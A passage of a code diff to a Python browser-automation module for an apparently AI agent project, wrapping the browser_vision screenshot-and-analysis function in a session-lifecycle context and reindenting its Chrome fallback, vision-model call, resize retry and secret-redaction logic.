+            raw_result = data.get("result", "[]")
 
-        try:
-            # Parse the JSON string returned by JavaScript
-            if isinstance(raw_result, str):
-                images = json.loads(raw_result)
-            else:
-                images = raw_result
+            try:
+                # Parse the JSON string returned by JavaScript
+                if isinstance(raw_result, str):
+                    images = json.loads(raw_result)
+                else:
+                    images = raw_result
 
+                response = {
+                    "success": True,
+                    "images": images,
+                    "count": len(images)
+                }
+                return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+            except json.JSONDecodeError:
+                response = {
+                    "success": True,
+                    "images": [],
+                    "count": 0,
+                    "warning": "Could not parse image data"
+                }
+                return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        else:
             response = {
-                "success": True,
-                "images": images,
-                "count": len(images)
+                "success": False,
+                "error": result.get("error", "Failed to get images")
             }
             return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-        except json.JSONDecodeError:
-            response = {
-                "success": True,
-                "images": [],
-                "count": 0,
-                "warning": "Could not parse image data"
-            }
-            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to get images")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> str:
@@ -3157,64 +3184,75 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     Returns:
         JSON string with vision analysis results and screenshot_path
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_vision
-        return camofox_vision(question, annotate, task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    import base64
-    import uuid as uuid_mod
-    from superforecasting_agent.constants import get_agent_dir
-    screenshots_dir = get_agent_dir("cache/screenshots", "browser_screenshots")
-    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
-    effective_task_id = _last_session_key(task_id or "default")
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_vision
+            return camofox_vision(question, annotate, task_id)
 
-    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
-    # via the fallback helper instead of letting the normal path fail with a
-    # CDP error or return a placeholder PNG.  The normal analysis path below
-    # still owns base64 encoding, provider routing, resizing retry, redaction,
-    # and response shape.
-    engine = _get_browser_engine()
-    _lp_prerouted = False
-    _lp_fallback_warning = None
-    if engine == "lightpanda" and _should_inject_engine(engine):
-        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
-        screenshot_args = []
-        if annotate:
-            screenshot_args.append("--annotate")
-        fb_result = _chrome_fallback_screenshot(
-            effective_task_id, screenshot_args, _get_command_timeout(),
-        )
-        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
-        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
-        if fb_result.get("success"):
-            _lp_prerouted = True
-            _lp_fallback_warning = fb_result.get("fallback_warning")
-            fb_path = fb_result.get("data", {}).get("path", "")
-            if fb_path and os.path.exists(fb_path):
-                from superforecasting_agent.constants import get_agent_dir
-                screenshots_dir = get_agent_dir("cache/screenshots", "browser_screenshots")
-                screenshots_dir.mkdir(parents=True, exist_ok=True)
-                import shutil as _shutil_vision
-                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
-                _shutil_vision.copy2(fb_path, persistent_path)
-                screenshot_path = persistent_path
-        else:
-            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
-            # Fall through to the normal screenshot path so _run_browser_command
-            # can still produce the standard fallback metadata/error.
-            _lp_prerouted = False
+        import base64
+        import uuid as uuid_mod
+        from superforecasting_agent.constants import get_agent_dir
+        screenshots_dir = get_agent_dir("cache/screenshots", "browser_screenshots")
+        screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
+        effective_task_id = _last_session_key(task_id or "default")
 
-    try:
-        screenshots_dir.mkdir(parents=True, exist_ok=True)
+        # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
+        # via the fallback helper instead of letting the normal path fail with a
+        # CDP error or return a placeholder PNG.  The normal analysis path below
+        # still owns base64 encoding, provider routing, resizing retry, redaction,
+        # and response shape.
+        engine = _get_browser_engine()
+        _lp_prerouted = False
+        _lp_fallback_warning = None
+        if engine == "lightpanda" and _should_inject_engine(engine):
+            logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
+            screenshot_args = []
+            if annotate:
+                screenshot_args.append("--annotate")
+            fb_result = _chrome_fallback_screenshot(
+                effective_task_id, screenshot_args, _get_command_timeout(),
+            )
+            fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
+            fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
+            if fb_result.get("success"):
+                _lp_prerouted = True
+                _lp_fallback_warning = fb_result.get("fallback_warning")
+                fb_path = fb_result.get("data", {}).get("path", "")
+                if fb_path and os.path.exists(fb_path):
+                    from superforecasting_agent.constants import get_agent_dir
+                    screenshots_dir = get_agent_dir("cache/screenshots", "browser_screenshots")
+                    screenshots_dir.mkdir(parents=True, exist_ok=True)
+                    import shutil as _shutil_vision
+                    persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
+                    _shutil_vision.copy2(fb_path, persistent_path)
+                    screenshot_path = persistent_path
+            else:
+                logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
+                # Fall through to the normal screenshot path so _run_browser_command
+                # can still produce the standard fallback metadata/error.
+                _lp_prerouted = False
 
-        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
-        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)
+        try:
+            screenshots_dir.mkdir(parents=True, exist_ok=True)
 
-        if _lp_prerouted and screenshot_path.exists():
-            result = {
-                "success": True,
-                "data": {
-                    "path": str(screenshot_path),
+            # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
+            _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)
+
+            if _lp_prerouted and screenshot_path.exists():
+                result = {
+                    "success": True,
+                    "data": {
+                        "path": str(screenshot_path),
+                        "fallback_warning": _lp_fallback_warning,
+                        "browser_engine": "chrome",
+                        "browser_engine_fallback": {
+                            "from": "lightpanda",
+                            "to": "chrome",
+                            "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
+                        },
+                    },
                     "fallback_warning": _lp_fallback_warning,
                     "browser_engine": "chrome",
                     "browser_engine_fallback": {
@@ -3222,162 +3260,154 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
                         "to": "chrome",
                         "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                     },
-                },
-                "fallback_warning": _lp_fallback_warning,
-                "browser_engine": "chrome",
-                "browser_engine_fallback": {
-                    "from": "lightpanda",
-                    "to": "chrome",
-                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
-                },
-            }
-        else:
-            # Take screenshot using agent-browser
-            screenshot_args = []
-            if annotate:
-                screenshot_args.append("--annotate")
-            screenshot_args.append("--full")
-            screenshot_args.append(str(screenshot_path))
-            result = _run_browser_command(
-                effective_task_id,
-                "screenshot",
-                screenshot_args,
-                # If the Lightpanda pre-route already failed, force Chrome so
-                # _run_browser_command doesn't trigger a redundant LP fallback.
-                _engine_override="auto" if _lp_prerouted else None,
-            )
-
-        if not result.get("success"):
-            error_detail = result.get("error", "Unknown error")
-            _cp = _get_cloud_provider()
-            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
-            error_response = {
-                "success": False,
-                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
-            }
-            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)
-
-        actual_screenshot_path = result.get("data", {}).get("path")
-        if actual_screenshot_path:
-            screenshot_path = Path(actual_screenshot_path)
-
-        # Check if screenshot file was created
-        if not screenshot_path.exists():
-            _cp = _get_cloud_provider()
-            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
-            return json.dumps({
-                "success": False,
-                "error": (
-                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
-                    f"This may indicate a socket path issue (macOS /var/folders/), "
-                    f"a missing Chromium install ('agent-browser install'), "
-                    f"or a stale daemon process."
-                ),
-            }, ensure_ascii=False)
-
-        # Convert screenshot to base64 at full resolution.
-        _screenshot_bytes = screenshot_path.read_bytes()
-        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
-        data_url = f"data:image/png;base64,{_screenshot_b64}"
-
-        vision_prompt = (
-            f"You are analyzing a screenshot of a web browser.\n\n"
-            f"User's question: {question}\n\n"
-            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
-            f"If there are interactive elements, describe them. If there are verification challenges "
-            f"or CAPTCHAs, describe what type they are and what action might be needed. "
-            f"Focus on answering the user's specific question."
-        )
-
-        # Use the centralized LLM router
-        vision_model = _get_vision_model()
-        logger.debug("browser_vision: analysing screenshot (%d bytes)",
-                     len(_screenshot_bytes))
-
-        # Read vision timeout/temperature from config (auxiliary.vision.*).
-        # Local vision models (llama.cpp, ollama) can take well over 30s for
-        # screenshot analysis, so the default timeout must be generous.
-        vision_timeout = 120.0
-        vision_temperature = 0.1
-        try:
-            from superforecasting_agent.runtime.config import load_config
-            _cfg = load_config()
-            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
-            _vt = _vision_cfg.get("timeout")
-            if _vt is not None:
-                vision_timeout = float(_vt)
-            _vtemp = _vision_cfg.get("temperature")
-            if _vtemp is not None:
-                vision_temperature = float(_vtemp)
-        except Exception:
-            pass
-
-        call_kwargs = {
-            "task": "vision",
-            "messages": [
-                {
-                    "role": "user",
-                    "content": [
-                        {"type": "text", "text": vision_prompt},
-                        {"type": "image_url", "image_url": {"url": data_url}},
-                    ],
                 }
-            ],
-            "max_tokens": 2000,
-            "temperature": vision_temperature,
-            "timeout": vision_timeout,
-        }
-        if vision_model:
-            call_kwargs["model"] = vision_model
-        # Try full-size screenshot; on size-related rejection, downscale and retry.
-        try:
-            response = call_llm(**call_kwargs)
-        except Exception as _api_err:
-            from tools.vision_tools import (
-                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
-            )
-            if (_is_image_size_error(_api_err)
-                    and len(data_url) > _RESIZE_TARGET_BYTES):
-                logger.info(
-                    "Vision API rejected screenshot (%.1f MB); "
-                    "auto-resizing to ~%.0f MB and retrying...",
-                    len(data_url) / (1024 * 1024),
-                    _RESIZE_TARGET_BYTES / (1024 * 1024),
-                )
-                data_url = _resize_image_for_vision(
-                    screenshot_path, mime_type="image/png")
-                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
-                response = call_llm(**call_kwargs)
             else:
-                raise
+                # Take screenshot using agent-browser
+                screenshot_args = []
+                if annotate:
+                    screenshot_args.append("--annotate")
+                screenshot_args.append("--full")
+                screenshot_args.append(str(screenshot_path))
+                result = _run_browser_command(
+                    effective_task_id,
+                    "screenshot",
+                    screenshot_args,
+                    # If the Lightpanda pre-route already failed, force Chrome so
+                    # _run_browser_command doesn't trigger a redundant LP fallback.
+                    _engine_override="auto" if _lp_prerouted else None,
+                )
 
-        analysis = (response.choices[0].message.content or "").strip()
-        # Redact secrets the vision LLM may have read from the screenshot.
-        from agent.redact import redact_sensitive_text
-        analysis = redact_sensitive_text(analysis)
-        response_data = {
-            "success": True,
-            "analysis": analysis or "Vision analysis returned no content.",
-            "screenshot_path": str(screenshot_path),
-        }
-        _copy_fallback_warning(response_data, result)
-        # Include annotation data if annotated screenshot was taken
-        if annotate and result.get("data", {}).get("annotations"):
-            response_data["annotations"] = result["data"]["annotations"]
-        return json.dumps(response_data, ensure_ascii=False)
+            if not result.get("success"):
+                error_detail = result.get("error", "Unknown error")
+                _cp = _get_cloud_provider()
+                mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
+                error_response = {
+                    "success": False,
+                    "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
+                }
+                return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)
 
-    except Exception as e:
-        # Keep the screenshot if it was captured successfully — the failure is
-        # in the LLM vision analysis, not the capture.  Deleting a valid
-        # screenshot loses evidence the user might need.  The 24-hour cleanup
-        # in _cleanup_old_screenshots prevents unbounded disk growth.
-        logger.warning("browser_vision failed: %s", e, exc_info=True)
-        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
-        if screenshot_path.exists():
-            error_info["screenshot_path"] = str(screenshot_path)
-            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
-        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
-        return json.dumps(error_info, ensure_ascii=False)
+            actual_screenshot_path = result.get("data", {}).get("path")
+            if actual_screenshot_path:
+                screenshot_path = Path(actual_screenshot_path)
+
+            # Check if screenshot file was created
+            if not screenshot_path.exists():
+                _cp = _get_cloud_provider()
+                mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
+                return json.dumps({
+                    "success": False,
+                    "error": (
+                        f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
+                        f"This may indicate a socket path issue (macOS /var/folders/), "
+                        f"a missing Chromium install ('agent-browser install'), "
+                        f"or a stale daemon process."
+                    ),
+                }, ensure_ascii=False)
+
+            # Convert screenshot to base64 at full resolution.
+            _screenshot_bytes = screenshot_path.read_bytes()
+            _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
+            data_url = f"data:image/png;base64,{_screenshot_b64}"
+
+            vision_prompt = (
+                f"You are analyzing a screenshot of a web browser.\n\n"
+                f"User's question: {question}\n\n"
+                f"Provide a detailed and helpful answer based on what you see in the screenshot. "
+                f"If there are interactive elements, describe them. If there are verification challenges "
+                f"or CAPTCHAs, describe what type they are and what action might be needed. "
+                f"Focus on answering the user's specific question."
+            )
+
+            # Use the centralized LLM router
+            vision_model = _get_vision_model()
+            logger.debug("browser_vision: analysing screenshot (%d bytes)",
+                         len(_screenshot_bytes))
+
+            # Read vision timeout/temperature from config (auxiliary.vision.*).
+            # Local vision models (llama.cpp, ollama) can take well over 30s for
+            # screenshot analysis, so the default timeout must be generous.
+            vision_timeout = 120.0
+            vision_temperature = 0.1
+            try:
+                from superforecasting_agent.runtime.config import load_config
+                _cfg = load_config()
+                _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
+                _vt = _vision_cfg.get("timeout")
+                if _vt is not None:
+                    vision_timeout = float(_vt)
+                _vtemp = _vision_cfg.get("temperature")
+                if _vtemp is not None:
+                    vision_temperature = float(_vtemp)
+            except Exception:
+                pass
+
+            call_kwargs = {
+                "task": "vision",
+                "messages": [
+                    {
+                        "role": "user",
+                        "content": [
+                            {"type": "text", "text": vision_prompt},
+                            {"type": "image_url", "image_url": {"url": data_url}},
+                        ],
+                    }
+                ],
+                "max_tokens": 2000,
+                "temperature": vision_temperature,
+                "timeout": vision_timeout,
+            }
+            if vision_model:
+                call_kwargs["model"] = vision_model
+            # Try full-size screenshot; on size-related rejection, downscale and retry.
+            try:
+                response = call_llm(**call_kwargs)
+            except Exception as _api_err:
+                from tools.vision_tools import (
+                    _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
+                )
+                if (_is_image_size_error(_api_err)
+                        and len(data_url) > _RESIZE_TARGET_BYTES):
+                    logger.info(
+                        "Vision API rejected screenshot (%.1f MB); "
+                        "auto-resizing to ~%.0f MB and retrying...",
+                        len(data_url) / (1024 * 1024),
+                        _RESIZE_TARGET_BYTES / (1024 * 1024),
+                    )
+                    data_url = _resize_image_for_vision(
+                        screenshot_path, mime_type="image/png")
+                    call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
+                    response = call_llm(**call_kwargs)
+                else:
+                    raise
+
+            analysis = (response.choices[0].message.content or "").strip()
+            # Redact secrets the vision LLM may have read from the screenshot.
+            from agent.redact import redact_sensitive_text
+            analysis = redact_sensitive_text(analysis)
+            response_data = {
+                "success": True,
+                "analysis": analysis or "Vision analysis returned no content.",
+                "screenshot_path": str(screenshot_path),
+            }
+            _copy_fallback_warning(response_data, result)
+            # Include annotation data if annotated screenshot was taken
+            if annotate and result.get("data", {}).get("annotations"):
+                response_data["annotations"] = result["data"]["annotations"]
+            return json.dumps(response_data, ensure_ascii=False)
+
+        except Exception as e:
+            # Keep the screenshot if it was captured successfully — the failure is
+            # in the LLM vision analysis, not the capture.  Deleting a valid
+            # screenshot loses evidence the user might need.  The 24-hour cleanup
+            # in _cleanup_old_screenshots prevents unbounded disk growth.
+            logger.warning("browser_vision failed: %s", e, exc_info=True)
+            error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
+            if screenshot_path.exists():
+                error_info["screenshot_path"] = str(screenshot_path)
+                error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
+            _copy_fallback_warning(error_info, result if 'result' in locals() else {})
+            return json.dumps(error_info, ensure_ascii=False)
 
 
 def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
